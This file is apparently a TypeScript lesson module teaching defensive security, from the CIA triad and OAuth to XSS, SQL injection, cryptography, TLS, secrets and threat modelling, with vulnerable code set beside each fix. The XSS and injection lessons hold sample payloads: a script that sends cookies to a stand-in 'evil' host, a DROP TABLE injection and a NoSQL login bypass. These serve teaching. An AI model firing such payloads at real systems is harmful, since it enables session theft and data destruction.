// ============================================================
// Security — All Tiers (T1–T4)
// ============================================================
// Defensive security only. Examples show vulnerable patterns
// alongside their fixes.
// ============================================================

import type { LessonContent } from "./python-basics";

export const securityLessons: Record<string, LessonContent> = {
  // ── T1 ──
  "security:t1:cia": {
    nodeId: "security:t1:cia", title: "CIA Triad",
    sections: [
      { heading: "Three Properties", body: "Confidentiality: only authorized parties can read. Integrity: data wasn't tampered with. Availability: legitimate users can access when needed. Most security work optimizes one or two of these — sometimes at the expense of others. The triad is a useful frame for classifying threats and mitigations, not a complete model." },
      { heading: "Threats By Property", body: "Confidentiality threats: eavesdropping, data leaks, accidental exposure. Integrity threats: tampering, forgery, supply-chain compromise, data corruption. Availability threats: DoS, misconfiguration, infrastructure failure. Categorize a threat first; mitigations follow naturally." },
      { heading: "Trade-offs", body: "More confidentiality often costs availability — heavily restricted access can lock out legit users. More integrity costs latency — signing every event isn't free. More availability via replication multiplies the leak surface and makes consistency harder. Security is engineering: pick the trade-offs deliberately, not by reflex." },
    ],
    codeExamples: [
      { title: "Mapping mitigations to CIA", code: `# Confidentiality
#   - TLS in transit
#   - Encryption at rest (AES-GCM, AES-XTS for disks)
#   - Access control (RBAC, ABAC, IAM)
#   - Data minimization (don't collect what you don't need)

# Integrity
#   - HMAC / signatures (e.g. JWT signing)
#   - Hash chaining / Merkle trees / append-only logs
#   - Code signing for software supply chain
#   - Audit trails

# Availability
#   - Redundancy / replication / multi-region
#   - Rate limiting / DDoS protection at the edge
#   - Graceful degradation
#   - Capacity planning + autoscaling`, explanation: "Each leg has a canonical toolset. Most threats are defended by one or two; understanding the leg helps pick the right defense." },
      { title: "When trade-offs collide", code: `# Hospital records
# - C: only doctors should read
# - I: must not be tampered with
# - A: must be accessible during emergencies
#
# 'Break-glass' access reconciles C with A:
#   - Normal: tight RBAC.
#   - Emergency: any clinician can override, but every override
#     is logged and reviewed.
# The fix isn't always 'more security' — sometimes it's
# 'monitored exception paths.'`, explanation: "Real systems balance the legs. Pure CIA optimization is rare and usually wrong." },
      { title: "Threat → property mapping practice", code: `# 'Attacker exfiltrates customer data'        → C
# 'Attacker modifies an order's price'         → I
# 'Attacker DDoSes the login service'          → A
# 'Backups corrupted; can't recover'           → I (and A)
# 'Insider sells contact list'                 → C
# 'Lost laptop with unencrypted disk'          → C
# 'Failed deploy takes site down for an hour'  → A
#
# First step in any incident: which leg(s) of CIA were violated?`, explanation: "Practiced mapping makes incident triage faster." },
    ],
    keyTakeaways: ["CIA: Confidentiality, Integrity, Availability", "Threats target one or more legs of CIA — categorize first", "Trade-offs are real: more C often costs A", "Sometimes the right answer is monitored exceptions, not stricter rules", "Map the threat to the leg before picking the mitigation"],
  },
  "security:t1:auth-basics": {
    nodeId: "security:t1:auth-basics", title: "AuthN vs AuthZ",
    sections: [
      { heading: "Different Questions", body: "Authentication (AuthN): who are you? Verified by passwords, MFA, biometrics, OAuth/OIDC. Authorization (AuthZ): what are you allowed to do? Decided by RBAC, ACLs, policy engines. Most bugs called 'auth' are actually AuthZ — letting an authed user do something they shouldn't (broken access control)." },
      { heading: "Sessions vs Tokens", body: "Server-side session: server stores state, client holds an opaque session ID in a cookie. Easy to revoke (delete from store), harder to scale across services. Tokens (JWT): client holds signed claims, server stays stateless. Easy to scale, hard to revoke (use short TTLs + refresh tokens, or maintain a deny-list). Most modern API ecosystems use tokens; many web apps still use sessions for the simplicity." },
      { heading: "OAuth 2.0 / OIDC At A Glance", body: "OAuth 2.0 is for delegating access to APIs ('let this app read my Google calendar'). OIDC (OpenID Connect) layers identity on top: now you can also use it for sign-in ('Sign in with Google'). The Authorization Code flow with PKCE is the recommended flow for web and mobile clients today; older flows like Implicit and Resource Owner Password Credentials are deprecated." },
    ],
    codeExamples: [
      { title: "JWT structure", code: `# header.payload.signature, base64url-encoded
# eg.
# eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9
#   .eyJzdWIiOiJ1XzEiLCJleHAiOjE3MDB9
#   .signature_bytes

# Header (decoded):  { "alg": "RS256", "typ": "JWT" }
# Payload (decoded): { "sub": "u_1", "exp": 1700... }
# Signature: HMAC (HS256) or RSA/ECDSA (RS256/ES256) over header.payload

# Verifying = recompute signature with the secret/public key
# and compare. If valid, trust the claims.`, explanation: "Self-contained credential. Verifying requires only the secret/public key — no DB hit. That's why it scales." },
      { title: "AuthZ check at every privileged op", code: `def can_edit(user, post):
    return user.id == post.author_id or user.role == "admin"

@route.put("/posts/<id>")
def update_post(id):
    user = current_user()           # AuthN — who?
    post = db.posts.find(id)
    if not post:
        return abort(404)
    if not can_edit(user, post):    # AuthZ — allowed?
        return abort(403)
    return do_update(post, request.json)`, explanation: "AuthN identifies the caller; AuthZ decides what they can do. They're separate checks — and AuthZ must run on every privileged operation, not once at login." },
      { title: "OAuth Authorization Code + PKCE", code: `# 1. Client (your app) generates a random code_verifier
#    and code_challenge = SHA256(code_verifier), base64url.
#
# 2. Redirect user to authorization server:
#    GET /authorize?
#      response_type=code&
#      client_id=...&
#      redirect_uri=...&
#      scope=openid profile&
#      state=<random>&
#      code_challenge=<challenge>&
#      code_challenge_method=S256
#
# 3. User authenticates and approves. Auth server redirects back:
#    /callback?code=<code>&state=<random>
#
# 4. Client POSTs to /token with code + code_verifier.
#    Auth server checks SHA256(code_verifier) == code_challenge,
#    issues access_token + (often) id_token + refresh_token.
#
# PKCE protects against interception of the code on mobile
# and SPAs that can't securely keep a client secret.`, explanation: "PKCE is the protection that makes Authorization Code safe for clients without a server-side secret. Use it for SPAs, mobile, and most modern web apps." },
    ],
    keyTakeaways: ["AuthN: who are you? AuthZ: what can you do? Separate concerns", "Most 'auth bugs' are actually AuthZ — broken access control", "Sessions: easy revoke, server state. Tokens: easy scale, short TTL", "Always re-check authorization on every privileged operation", "OAuth Authorization Code + PKCE is the modern recommended flow"],
  },

  // ── T2 ──
  "security:t2:owasp": {
    nodeId: "security:t2:owasp", title: "OWASP Top 10",
    sections: [
      { heading: "What It Is", body: "An OWASP-published list of the most common web application security risks, refreshed every few years (most recent at 2021; a 2025 refresh is in progress). Recent top items: Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration, Vulnerable & Outdated Components, Identification & Authentication Failures, Software & Data Integrity Failures, Security Logging & Monitoring Failures, Server-Side Request Forgery (SSRF). Don't memorize the order — internalize the categories." },
      { heading: "Broken Access Control Is #1 For A Reason", body: "Routinely tops the list. Caused by checking authorization in client-side JS only, missing checks on indirect access paths (admin endpoints exposed via undocumented URLs), and IDOR (Insecure Direct Object Reference: /api/orders/123 returns any order if you change the ID). Defense: enforce on the server, every request, every resource. Don't rely on UI hiding things." },
      { heading: "How To Use The List", body: "It's a checklist for review and threat modeling, not a full curriculum. You can ace OWASP and still get owned by a logic bug or a supply-chain compromise. Pair the list with secure-by-default frameworks, dependency scanning (Dependabot, Snyk), code review, and a bug bounty program. Use the list to drive baseline; don't stop there." },
    ],
    codeExamples: [
      { title: "Broken access control: IDOR", code: `# BAD — no ownership check
@route.get("/api/orders/<id>")
def order(id):
    return db.orders.find(id)
    # Any authed user can read any order by changing the ID.

# RIGHT — ownership enforced on the server
@route.get("/api/orders/<id>")
def order(id):
    o = db.orders.find(id)
    if o is None:
        return abort(404)
    if o.user_id != current_user().id and not is_admin():
        return abort(403)
    return o`, explanation: "Never trust the client to enforce authorization. Check on every request." },
      { title: "Misconfiguration trap", code: `# Real things shipped to production:
# - Default admin/admin credentials still set
# - Debug endpoints exposed (/_debug, /admin without auth)
# - Verbose error pages leaking stack traces and SQL fragments
# - CORS Access-Control-Allow-Origin: * on sensitive APIs
# - Cloud storage buckets accidentally set to public
# - .git/ directory served by the web server
# - .env file accessible at /env
#
# Misconfiguration is reliably top-5 every year.
# Fix: secure-by-default frameworks + automated scanning.`, explanation: "More breaches start here than from clever exploits. Secure defaults > checklists." },
      { title: "Vulnerable components", code: `# Modern apps pull in hundreds of dependencies.
# Every CVE in any of them is your problem.
#
# Mitigations:
# - npm audit / pip-audit / cargo audit in CI
# - Dependabot / Renovate for automated PRs
# - Lock files (package-lock.json, requirements.txt) for reproducible builds
# - SBOMs (software bill of materials) for compliance + audit
# - Vendor minimally — every new dependency expands the attack surface

# 'Update everything, all the time' isn't perfect, but it beats
# 'patch when something breaks.'`, explanation: "Supply chain attacks are real and growing. Automate scanning + updates." },
    ],
    keyTakeaways: ["OWASP Top 10 = checklist of common web flaws (refreshed periodically)", "Broken Access Control routinely tops the list", "Misconfiguration is reliably top-5 — secure defaults beat checklists", "Vulnerable components are now a major class — automate scanning", "Use OWASP as a baseline, not the ceiling"],
  },
  "security:t2:xss": {
    nodeId: "security:t2:xss", title: "Cross-Site Scripting (XSS)",
    sections: [
      { heading: "Three Flavors", body: "Stored: attacker injects payload into the DB; victims execute it when they fetch the page (comment fields, profile names, anywhere user content is rendered). Reflected: payload in the URL/form is echoed back and executed (search results that show your query, error pages). DOM-based: payload acts on client-side JS without the server ever seeing it (URL hash fragments, postMessage handlers)." },
      { heading: "Defenses", body: "Output encoding is the primary defense — frameworks like React, Vue, Angular, Svelte all do this by default. Treat user input as data, not code. Content Security Policy (CSP) limits what scripts the browser will execute even if you slip — strong CSP makes XSS dramatically harder. HttpOnly cookies prevent JS from reading session tokens. Avoid innerHTML / dangerouslySetInnerHTML / v-html with untrusted input." },
      { heading: "CSP In Practice", body: "Start in report-only mode (Content-Security-Policy-Report-Only) to see what would break. Tighten progressively. Strict-style: default-src 'self'; script-src 'self' 'nonce-<random>'; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'. The nonce changes per request, allowing legitimate inline scripts but rejecting injected ones. CSP is defense in depth, not a substitute for output encoding." },
    ],
    codeExamples: [
      { title: "Reflected XSS pattern", code: `# BAD — user input dropped raw into HTML
@route.get("/search")
def search():
    q = request.args["q"]
    return f"<h1>Results for {q}</h1>"

# Attacker visits:
# /search?q=<script>fetch('https://evil/leak?c='+document.cookie)</script>
# → script runs in victim's browser; cookies exfiltrated

# RIGHT — escape output
from markupsafe import escape
@route.get("/search")
def search():
    q = request.args["q"]
    return f"<h1>Results for {escape(q)}</h1>"`, explanation: "Treat user input as data, never as HTML. Most frameworks escape by default — but only when you use the framework's templating, not raw concatenation." },
      { title: "Strong CSP", code: `# Response header
# Content-Security-Policy:
#   default-src 'self';
#   script-src 'self' 'nonce-RANDOM_PER_REQUEST';
#   style-src 'self' 'unsafe-inline';
#   img-src 'self' data: https:;
#   connect-src 'self' https://api.example.com;
#   frame-ancestors 'none';
#   base-uri 'self';

# In the HTML
# <script nonce="RANDOM_PER_REQUEST">/* legitimate inline script */</script>

# Effects:
# - default-src 'self' blocks everything not from your origin
# - nonce allows your inline scripts; injected ones lack the nonce
# - frame-ancestors 'none' = X-Frame-Options DENY (clickjacking)
# - base-uri prevents <base> tag injection`, explanation: "CSP is layered defense. Even if XSS slips through escaping, CSP blocks the script from running." },
      { title: "DOM-based XSS", code: `// BAD — using URL hash without sanitization
const id = location.hash.slice(1);  // user-controlled
document.getElementById("result").innerHTML = id;
// /page#<img src=x onerror=alert(1)>
// → alert fires

// RIGHT — use textContent for plain text
document.getElementById("result").textContent = id;
// or use a framework that escapes by default`, explanation: "DOM XSS happens entirely client-side; the server never sees the payload. Use safe DOM APIs." },
    ],
    keyTakeaways: ["Stored, reflected, DOM-based — three flavors", "Output-encode user content (frameworks default to this)", "CSP limits what runs even if escaping fails — defense in depth", "Use nonce-based CSP for legitimate inline scripts", "HttpOnly cookies block JS-stolen sessions"],
  },
  "security:t2:sql-injection": {
    nodeId: "security:t2:sql-injection", title: "SQL Injection",
    sections: [
      { heading: "How It Happens", body: "User input is concatenated into a SQL string. The attacker breaks out of the string with a quote, appends arbitrary SQL. Effects: data extraction, modification, deletion, occasionally remote code execution via DB extensions. Decades old, still finds production systems regularly." },
      { heading: "Parameterized Queries — The Only Real Fix", body: "Use placeholders. The DB driver sends the SQL and the parameters separately, so the input never gets parsed as SQL. ORMs make this the default. Don't sanitize-by-stripping — escape rules vary by DB version, character set, and context, and edge cases are how attackers win." },
      { heading: "Beyond Plain SQLi", body: "Second-order injection: input is stored safely, but used unsafely later (e.g., a username re-used in an admin tool that builds dynamic SQL). NoSQL injection: same idea applied to MongoDB, etc., where queries are JSON objects — passing { $gt: '' } where you expected a string. ORM injection: raw SQL escape hatches in ORMs let unsafe patterns sneak back in." },
    ],
    codeExamples: [
      { title: "Vulnerable", code: `# BAD — string-concatenated SQL
def find_user(name):
    sql = f"SELECT * FROM users WHERE name = '{name}'"
    return db.execute(sql).fetchall()

# Attacker passes: ' OR 1=1 --
# Final SQL:
#   SELECT * FROM users WHERE name = '' OR 1=1 --'
# → returns every user row

# Worse: '; DROP TABLE users; --
# → if the driver allows multi-statement, the table is gone.`, explanation: "Classic injection. Auth bypass at minimum, dump or DROP at worst." },
      { title: "Parameterized — the fix", code: `# RIGHT — placeholders, driver binds parameters
def find_user(name):
    return db.execute(
        "SELECT * FROM users WHERE name = ?", (name,)
    ).fetchall()

# Driver sends:
#   query: "SELECT * FROM users WHERE name = ?"
#   params: ["' OR 1=1 --"]
# DB plans the query once, binds params as data. The OR clause
# is treated as a literal string. Attacker is matched against
# users named exactly "' OR 1=1 --" — none exist.

# Placeholder syntax varies:
# - SQLite, ODBC: ?
# - psycopg2 (Postgres): %s
# - asyncpg: $1, $2
# - SQLAlchemy: bound params via .bindparam or :name`, explanation: "Driver-level separation. The only safe pattern. ORMs default to this; raw SQL needs care." },
      { title: "NoSQL injection (MongoDB-style)", code: `# BAD — passing JSON directly from request to query
@route.post("/login")
def login():
    body = request.json
    user = db.users.find_one({
        "email": body["email"],
        "password": body["password"],   # attacker can pass an object here
    })

# Attacker POSTs: { "email": "ada@example.com", "password": { "$ne": null } }
# Mongo treats password as: $ne null = "any non-null password"
# → password check bypassed.

# RIGHT — coerce to expected types
email = str(body.get("email", ""))
password = str(body.get("password", ""))
if not email or not password:
    return abort(400)
user = db.users.find_one({"email": email, "password": password})`, explanation: "NoSQL injection is real. Coerce input to expected types; never trust raw JSON for security-sensitive comparisons." },
    ],
    keyTakeaways: ["SQL injection = user input becoming SQL code", "Parameterized queries are the only safe answer", "Don't sanitize-by-stripping — escape rules are version-fragile", "Second-order injection: stored safely, used unsafely later", "NoSQL injection exists too — coerce input to expected types"],
  },

  // ── T3 ──
  "security:t3:crypto-basics": {
    nodeId: "security:t3:crypto-basics", title: "Cryptography Basics",
    sections: [
      { heading: "Symmetric, Asymmetric, Hashing", body: "Symmetric (AES-GCM, ChaCha20-Poly1305): same key encrypts and decrypts; fast, used for bulk data. Asymmetric (RSA, ECC like P-256 / Ed25519): public key encrypts/verifies; private key decrypts/signs. Slower; used for key exchange and signatures. Hashing (SHA-256, BLAKE3): one-way, fixed-length digest. None of these are interchangeable — confusing them is how systems get broken." },
      { heading: "Don't Roll Your Own Crypto", body: "Cryptographers have spent 50 years cataloguing pitfalls. AES-CBC without a separate MAC is vulnerable to padding-oracle attacks. AES-ECB reveals patterns. RSA without proper padding (PKCS1 v1.5) is broken in subtle ways. Even hash functions: MD5 and SHA-1 are broken for collision resistance. Use vetted libraries (libsodium, Python's cryptography, Web Crypto). Use AEAD (Authenticated Encryption with Associated Data) like AES-GCM by default — it gives you encryption AND integrity in one operation." },
      { heading: "Password Hashing Is Different", body: "Don't use SHA for passwords. Fast hashes are exactly what attackers want — they brute-force billions per second on a GPU. Use slow, salted, memory-hard hashes designed for passwords: bcrypt (battle-tested), argon2id (modern recommendation), scrypt. They're tunable: pick a work factor that takes ~100ms on your server. As hardware gets faster, raise the work factor." },
    ],
    codeExamples: [
      { title: "Symmetric AEAD (Python cryptography)", code: `from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

key = AESGCM.generate_key(bit_length=256)  # AES-256
nonce = os.urandom(12)                     # 12 bytes for AES-GCM
aesgcm = AESGCM(key)

# Encrypt with optional associated data (not encrypted but authenticated)
ciphertext = aesgcm.encrypt(nonce, b"secret message", b"associated_metadata")

# Decrypt — fails if anything was tampered
plaintext = aesgcm.decrypt(nonce, ciphertext, b"associated_metadata")
print(plaintext)  # b"secret message"

# Critical: NEVER reuse a nonce with the same key.
# AES-GCM is catastrophically broken under nonce reuse.`, explanation: "AEAD bundles encryption + integrity. Always pass associated data for context (key version, content type) so a ciphertext from one context can't be replayed in another." },
      { title: "Password hashing (passwords ≠ data)", code: `# WRONG — fast hash, no salt → rainbow tables eat you for breakfast
import hashlib
hashlib.sha256(b"hunter2").hexdigest()

# RIGHT — bcrypt
import bcrypt
hashed = bcrypt.hashpw(b"hunter2", bcrypt.gensalt(12))  # work factor 12
bcrypt.checkpw(b"hunter2", hashed)  # True

# BETTER — argon2id (the modern recommendation)
from argon2 import PasswordHasher
ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
hashed = ph.hash("hunter2")
ph.verify(hashed, "hunter2")  # raises on mismatch`, explanation: "bcrypt or argon2id. Both slow + salted; argon2 is also memory-hard. Tune work factor to ~100ms per hash on your server." },
      { title: "Common pitfalls list", code: `# DON'T:
# - Implement crypto primitives yourself
# - Use AES-ECB (reveals patterns; the famous Tux penguin image)
# - Use AES-CBC without a MAC (padding oracle attacks)
# - Reuse a nonce with the same AEAD key
# - Use MD5 or SHA-1 for collision resistance
# - Use SHA-256 / SHA-512 / etc. for password storage
# - Use Math.random() / crypto.randomUUID for security tokens (use crypto-random)
# - Compare secrets with == (use constant-time comparison: hmac.compare_digest)

# DO:
# - Use AEAD (AES-GCM, ChaCha20-Poly1305) by default
# - Use bcrypt / argon2id for passwords
# - Use Ed25519 / ECDSA P-256 for signatures
# - Generate randomness with crypto-secure RNGs (os.urandom, secrets module)
# - Compare with constant-time helpers`, explanation: "Crypto failure modes are subtle and devastating. Memorize the don'ts." },
    ],
    keyTakeaways: ["Symmetric (AES-GCM) fast; asymmetric (RSA/ECC) for key exchange + signing", "Hashing for integrity (SHA-256); password hashing is different (bcrypt/argon2)", "Use AEAD by default — encryption + integrity in one operation", "NEVER reuse a nonce with the same AEAD key", "Use vetted libraries (libsodium, cryptography); never roll your own"],
  },
  "security:t3:tls-pki": {
    nodeId: "security:t3:tls-pki", title: "TLS & PKI",
    sections: [
      { heading: "Public Key Infrastructure", body: "CAs (Certificate Authorities) issue certificates. Browsers and OSes trust a list of root CAs (a few hundred globally). Intermediate CAs are signed by roots; leaf certs are signed by intermediates. Trust flows downward through the chain. Let's Encrypt issues free certs (90-day default) and revolutionized TLS adoption since 2016." },
      { heading: "Revocation Reality", body: "OCSP (Online Certificate Status Protocol) and CRLs (Certificate Revocation Lists) report revoked certs. Both are flaky in practice — OCSP requires a network call that can be slow or blocked; CRLs grow unboundedly. The operational answer became: shorten cert lifetimes (90 days, soon 47 days, ultimately ~6 days for Let's Encrypt's short-lived certs). Browsers also ship hardcoded revocation lists for the most critical issues (CRLite, OneCRL)." },
      { heading: "HSTS And Pinning", body: "HSTS (HTTP Strict Transport Security): a response header that tells browsers 'always use HTTPS for this domain for the next N seconds.' Once cached, it prevents downgrade attacks. Preload lists go further — domains baked into the browser. Cert pinning was once popular but mostly retired in favor of CT (Certificate Transparency) logs that publicly record every issued cert — operationally safer." },
    ],
    codeExamples: [
      { title: "Inspect a cert", code: `# Pull and dump details
openssl s_client -showcerts -connect example.com:443 < /dev/null 2>/dev/null \\
  | openssl x509 -noout -text | head -30

# You'll see:
# Subject: CN = example.com
# Issuer:  CN = Let's Encrypt R3
# Validity:
#   Not Before: ...
#   Not After:  ...    (90 days from issuance)
# X509v3 Subject Alternative Name (SAN):
#   DNS:example.com, DNS:www.example.com
# Public Key Algorithm: ECDSA P-256 or RSA 2048+`, explanation: "Subject = the cert's subject (the site). Issuer = who signed it. SAN lists every name the cert is valid for." },
      { title: "HSTS done right", code: `# Recommended for production HTTPS sites
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# - max-age = 1 year (the longer, the more protection)
# - includeSubDomains = also covers subdomains
# - preload = candidate for browser-baked-in list at hstspreload.org

# CAUTION: HSTS is sticky. Once browsers cache it, you can't
# serve plain HTTP from that domain for the next year. Don't
# enable preload until you're certain you'll never need to.`, explanation: "HSTS is the simplest big security win. Set it everywhere, but understand the lock-in." },
      { title: "Certificate Transparency", code: `# Every cert issued by a public CA is logged to public,
# append-only CT logs. Anyone can monitor logs for certs
# issued for their domain.
#
# Set up monitoring:
# - crt.sh — search certs by domain
# - Facebook CT monitor, Cloudflare's tools — alerts
#
# This catches:
# - Mis-issuance by a CA (your domain certed by someone you didn't ask)
# - Malicious certs issued to phishing twins of your domain
#
# CT replaced cert pinning for most use cases.`, explanation: "Public ledger of issued certs. Operationally less risky than pinning while providing similar protection against CA compromise." },
    ],
    keyTakeaways: ["PKI: roots → intermediates → leaf certs; trust ships with browsers/OSes", "Short cert lifetimes (90d, soon less) replaced practical revocation", "HSTS forces HTTPS; preload bakes it into browsers", "Certificate Transparency logs every issued cert publicly", "mTLS for service-to-service when client cert lifecycle is automated"],
  },

  // ── T4 ──
  "security:t4:secrets": {
    nodeId: "security:t4:secrets", title: "Secrets Management",
    sections: [
      { heading: "Where NOT To Put Secrets", body: "Not in source control (git history is forever; private repos can leak). Not in client-side code (anyone can view-source). Not in logs. Not in error pages. Not in browser localStorage if XSS is a concern. Not in shared docs. The single most common breach root cause is a leaked secret in a public repo, paste site, or screenshot." },
      { heading: "Where To Put Secrets", body: "Environment variables for app config (with a .env file gitignored locally; injected by the platform in prod). A secret manager (AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, HashiCorp Vault) for rotation, audit, and central management. KMS (Key Management Service) for envelope encryption — encrypt data with a data key, encrypt the data key with a master key. Service identity (IAM roles, Workload Identity) for cloud-to-cloud — eliminates long-lived credentials entirely." },
      { heading: "Rotation And Detection", body: "Rotate predictably, not reactively. Common cadence: API keys quarterly, signing keys yearly, passwords on compromise indication. Detection: scan repos with TruffleHog / gitleaks; alert on commits matching secret patterns. Have a clear playbook for 'we leaked a secret' — every minute past detection is more risk." },
    ],
    codeExamples: [
      { title: "Env var pattern", code: `# In code (Python, Node, etc.)
import os
api_key = os.environ["STRIPE_API_KEY"]
db_url  = os.environ["DATABASE_URL"]

# In dev: .env file (gitignored), loaded via dotenv
#   STRIPE_API_KEY=sk_test_...
#
# In prod: injected by the platform
#   - Vercel: Project Settings → Environment Variables
#   - Kubernetes: Secrets resource → mounted into the pod env
#   - AWS ECS: secrets pulled from Secrets Manager into env at task start
#
# Never: hardcoded in code, baked into Docker images, in CI logs.`, explanation: "Process env is the standard injection point. The platform handles secure injection at deploy time." },
      { title: "Service identity (no long-lived creds)", code: `# Old way:
#   - Generate AWS access key + secret
#   - Store in env var or .aws/credentials
#   - Risk: long-lived credential in many places
#
# New way (AWS):
#   - EC2 / ECS / EKS pod assumes an IAM role automatically
#   - SDK fetches short-lived credentials from instance metadata
#   - Credentials rotate every few hours
#   - You never see them
#
# Equivalents:
#   - GCP: Workload Identity (GKE), Workload Identity Federation (off-cloud)
#   - Azure: Managed Identity
#   - Kubernetes: Service Account tokens, projected to mounted file
#
# Always prefer service identity to access keys.`, explanation: "Eliminate the credential. Best secret is no secret." },
      { title: "Secret rotation playbook", code: `# Periodic rotation (cron job or workflow):
# 1. Generate new secret in the secret manager (creates new version)
# 2. Update consumers to read both old and new for a grace window
# 3. Wait for full propagation (cache TTLs, deploys)
# 4. Cut consumers over to new
# 5. Revoke / disable old
# 6. Verify nothing broke; remove old version

# Reactive rotation (suspected leak):
# 1. Revoke the leaked secret IMMEDIATELY
# 2. Rotate, deploy, verify
# 3. Audit access logs from leak time onward
# 4. Postmortem: how did it leak? close the path`, explanation: "Rotation should be boring and automated. The first rotation always reveals what's hardcoded somewhere." },
    ],
    keyTakeaways: ["Never commit secrets — scan repos for them", "Env vars + secret manager for production", "Use service identity (not access keys) for cloud-to-cloud", "Rotate predictably, automated where possible", "Have a leaked-secret playbook before you need it"],
  },
  "security:t4:threat-modeling": {
    nodeId: "security:t4:threat-modeling", title: "Threat Modeling",
    sections: [
      { heading: "STRIDE", body: "Microsoft's framework. For each component or data flow, walk through six threat categories: Spoofing identity, Tampering with data, Repudiation, Information disclosure, Denial of service, Elevation of privilege. For each that applies, what mitigation exists? Cheap, surprisingly effective at finding gaps. Pairs naturally with data-flow diagrams." },
      { heading: "Trust Boundaries", body: "Draw boxes for components, arrows for data flow. The places where untrusted meets trusted are the trust boundaries — and that's where most vulnerabilities live. Concentrate defenses there: input validation, authentication, authorization, rate limiting, logging. A request crossing from public internet to your edge is the most important boundary; one inside your data center between two services is also a boundary if they have different trust levels." },
      { heading: "When To Threat Model", body: "Early, on every new significant feature, and after any architectural shift. Update the model as the system evolves. Output: a list of identified threats with mitigations either implemented or accepted. Acceptance is fine — risk-based decisions, not binary 'must fix all.' Track action items to completion; an unfixed threat that nobody owns is the breach you'll see in the postmortem." },
    ],
    codeExamples: [
      { title: "STRIDE walkthrough: file upload endpoint", code: `# Component: POST /api/upload (file upload by authenticated user)
#
# Spoofing
#   Threat: attacker uploads as someone else
#   Mitigation: AuthN required (JWT/session); CSRF token if cookie-auth
#
# Tampering
#   Threat: file modified in transit; metadata spoofed
#   Mitigation: TLS in transit; verify content-type vs magic bytes;
#               re-sign manifest server-side
#
# Repudiation
#   Threat: user denies uploading
#   Mitigation: audit log: who, when, what, IP; immutable storage
#
# Information disclosure
#   Threat: EXIF / metadata leak; ACL too loose; server-side path traversal
#   Mitigation: strip EXIF; signed URLs for download; bucket policy
#
# Denial of service
#   Threat: huge files; many concurrent uploads
#   Mitigation: size limit (e.g. 25MB); rate limit per user; quota
#
# Elevation of privilege
#   Threat: file is actually a script run by the server / browser
#   Mitigation: validate type; serve from separate origin (cookie-less);
#               Content-Disposition: attachment; antivirus scan`, explanation: "Walk every STRIDE letter for the component. Six lines, six threats covered." },
      { title: "Trust boundaries", code: `# Public Internet → Edge (CDN / WAF / LB)
#                  ^ trust boundary
#                    Defenses: TLS, basic DDoS, WAF rules, rate limit, BotID
#
# Edge → App tier
#       ^ trust boundary
#         Defenses: AuthN, AuthZ, request validation, business rules
#
# App tier → DB / cache / queue
#           ^ trust boundary (less stark, but still real)
#             Defenses: parameterized queries, ACLs, secrets, network policies
#
# At each boundary: input validation, authn/authz where applicable, logging.
# The deeper you are, the more you can trust — but trust nothing absolutely.`, explanation: "Every layer is a chance to validate. Defense in depth means catching the same threat at multiple layers." },
      { title: "Putting it on a page", code: `# Threat model deliverable (markdown is fine):
#
# # Threat Model: User Upload Service
# Date: 2025-01-15
# Authors: Ada, Linus
#
# ## Components
# - API gateway, App service, S3 bucket, Antivirus worker
#
# ## Data flows
# 1. Client → API gateway → App → S3 (PUT)
# 2. Antivirus worker pulls from S3, scans, marks safe/quarantine
# 3. Client → CDN (signed URL) → S3 (GET safe-only)
#
# ## STRIDE per component
# (table here)
#
# ## Open risks
# - [ ] No malware scanning in upload path (only async); decided acceptable for MVP
# - [ ] Bucket public access protection: enabled but unmonitored
#
# ## Action items
# - [ ] Add CloudTrail alert on bucket policy changes (owner: ada, due 2025-01-22)
# - [ ] Document signed-URL TTL policy (owner: linus, due 2025-01-30)`, explanation: "Living document. Not pretty, just clear. Reviewed quarterly." },
    ],
    keyTakeaways: ["STRIDE: Spoofing, Tampering, Repudiation, Info disclosure, DoS, Elevation", "Walk every category for each component", "Trust boundaries are where vulnerabilities concentrate", "Threat-model early; update on architectural shifts", "Track action items to completion — unfixed threats become breaches"],
  },
};
